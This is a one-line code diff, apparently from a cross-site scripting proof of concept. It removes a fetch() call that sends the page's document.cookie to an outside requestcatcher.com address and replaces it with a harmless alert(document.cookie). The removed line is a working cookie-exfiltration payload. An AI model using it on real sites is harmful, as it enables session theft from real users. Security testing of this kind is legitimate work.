@@ -1,1 +1,1 @@
-fetch(`https://tkjgkrf.requestcatcher.com/${document.cookie}`)
+alert(document.cookie)
